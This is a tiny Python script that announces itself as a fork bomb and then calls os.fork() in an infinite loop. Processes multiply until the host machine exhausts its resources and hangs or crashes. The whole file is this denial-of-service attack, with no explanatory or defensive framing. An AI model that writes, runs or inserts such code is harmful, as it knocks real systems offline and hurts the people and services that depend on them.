#!/usr/bin/env python3

import os

print('Starting fork bomb...')
while True:
  os.fork()